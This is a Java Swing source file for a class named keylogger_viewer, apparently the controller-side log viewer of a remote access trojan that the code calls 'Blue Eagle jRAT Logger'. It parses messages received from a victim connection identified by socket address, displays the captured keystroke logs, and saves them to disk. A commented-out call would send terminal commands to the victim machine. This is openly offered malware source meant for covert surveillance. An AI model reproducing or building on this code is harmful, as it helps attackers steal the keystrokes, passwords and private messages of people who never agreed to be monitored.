package New;

import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.TextArea;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.util.ArrayList;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.UIManager;
import javax.swing.filechooser.FileNameExtensionFilter;
import javax.swing.plaf.FontUIResource;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;

public class keylogger_viewer {
	private  JFrame form ;
 

	private static String Exe_Split = "fxf0x4x4x0fxf";
	private static String Exe_Ending = "c2x2824x828200x0c";
	private static String Jar_Split = "fxf0x4x4x0fxf";
	private static String Jar_Ending = "c2x2824x828200x0c";
	private  String sock = "";
	private JScrollPane scroll_result;
 
	private  JTextArea Dir,Result ;
	
	public keylogger_viewer(String sock2) {
		 this.sock = sock2;
	}
	public  void Set_sock(String ip){
		sock = ip;
	}
	public  String Get_sock(){
		return sock ;
	}
	public  void command(){
		//Master.Send_Data("execute_terminal" + Exe_Split +  Dir.getText() + Exe_Split + Exe_Ending,sock);
	}
	 
  
	 private   ArrayList<String> SplitString(String s){
		 String Word = "";
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private   ArrayList<String> SplitString_D(String s,String Delimeter){
		 String Word = "";
		 
		 String YY = Delimeter;
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }

	public  void Perform_data(String Received){
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
		  System.out.println("here          " + Received );
			if (Received.isEmpty()==false){
				 
					Received = Received.replace("c2x2824x828200x0c", YY);
					
					  switch (SplitString(Received).get(0)){
					 
					  case "keylogger_data":
						  TextArea jx = new TextArea();
							jx.setText((("Client "+sock +"\n"+" Keylogger Data / LOG FILES [Blue Eagle jRAT Logger]" + "\n" + SplitString(Received).get(3))));
						  Result.setText(jx.getText());
						  Result.setForeground(Color.BLACK);
						  Result.repaint();
						  scroll_result.repaint();
						  break;
					 
					  }
					
				 
					
				
			}
				
		
	}
	public  void Do_frame(){
		 form = new JFrame("Logs Viewer For : " + sock);
		 form.setResizable(false);
		  
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		 form.setBounds((widthx -500)/2,( heightx -430)/2, 500, 430);
		 form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 14);
		 Dir = new JTextArea("");
		 Dir.setBounds(5, 5, 485, 65);
		 Dir.setBackground(Color.BLACK);
		 Dir.setForeground(Color.GREEN);
		 Result = new JTextArea("");
		 Result.setFont(font);;
		 Result.setBackground(Color.WHITE);
		 Result.setForeground(Color.GREEN);
		 Dir.setCaretColor(Color.GREEN);
		 Dir.addKeyListener(new KeyListener() {
			
			@Override
			public void keyTyped(KeyEvent e) {
				// TODO Auto-generated method stub
				if(e.getKeyCode() == KeyEvent.VK_ENTER){//after release , to leave some availibility to press any other key to cancel that event if wrong pressed
					  Dir.setText("");
				}
			}
			
			@Override
			public void keyReleased(KeyEvent e) {
				// TODO Auto-generated method stub
				if(e.getKeyCode() == KeyEvent.VK_ENTER){//after release , to leave some availibility to press any other key to cancel that event if wrong pressed
					  Dir.setText("");
				}
			}
			
			@Override
			public void keyPressed(KeyEvent e) {
				// TODO Auto-generated method stub
				if(e.getKeyCode() == KeyEvent.VK_ENTER){//after release , to leave some availibility to press any other key to cancel that event if wrong pressed
					  command();
					  Dir.setText("");
					   
				 }
			}
		});
		 
		 
		 JButton btnNext = new JButton("Save Logs");
			btnNext.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					//do here some stuff
					 

					  final JFileChooser SaveAs = new JFileChooser();
				      SaveAs.setApproveButtonText("Save");
				      int actionDialog = SaveAs.showOpenDialog(form);
				      if (actionDialog != JFileChooser.APPROVE_OPTION) {
				         return;
				      }

				      File fileName = new File(SaveAs.getSelectedFile() + ".txt");
				      BufferedWriter outFile = null;
				      try {
				         outFile = new BufferedWriter(new FileWriter(fileName));

				         Result.write(outFile);   // *** here: ***
				         
				         if (outFile != null) {
				             try {
				                outFile.close();
				             } catch (Exception e) {
				               
				             }}
				         new MessageBox().infoBox("Logs file saved to : " + SaveAs.getSelectedFile() + ".txt", "Logs file Saved");
				      } catch (Exception ex) {
				         ex.printStackTrace();
				      } 
				   }
			
					
			
 
				
			});
			btnNext.setBounds(5, 5, 150, 23);
			
			DefaultTableModel model = new DefaultTableModel(){

     	         @Override
     	         public boolean isCellEditable(int row, int column) {
     	             //Only the third column
     	             return false;
     	         }
     	    	public Class<?> getColumnClass(int column) {
     	           switch(column) {
     	               
     	               case 0: return ImageIcon.class;
     	               default: return Object.class;
     	           	}
     	   				}
			};

			
		 
			Result.setEditable(false);
			 scroll_result = new JScrollPane (Result,JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS); 
			 //form.setBounds((widthx -500)/2,( heightx -430)/2, 500, 430);
			scroll_result.setBounds(5, 50,488,300  );
	        
	        btnNext.setFont(font);
			Dir.setFont(font);
			 
			 
			
			
			
			
		   form.addWindowListener(new java.awt.event.WindowAdapter() {
			    @Override
			    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
			        if (JOptionPane.showConfirmDialog(form, 
			            "Are you sure you want to close Logs Viewer window?", "Close Window?", 
			            JOptionPane.YES_NO_OPTION,
			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
			       Master.Remove_Form_Loggers(sock);
			        }
			    }
			});
			
			
			
			
		   FontUIResource fontx = new FontUIResource("Verdana", Font.PLAIN, 13);
		   UIManager.put("Table.font", fontx);
		   UIManager.put("Table.foreground", Color.RED);
			 form.add(btnNext);
		 
		      form.add(scroll_result);
			 form.validate();
			 form.getContentPane().setBackground(Color.WHITE);
			 form.setVisible(true);
			
	}
	
	 
	
}
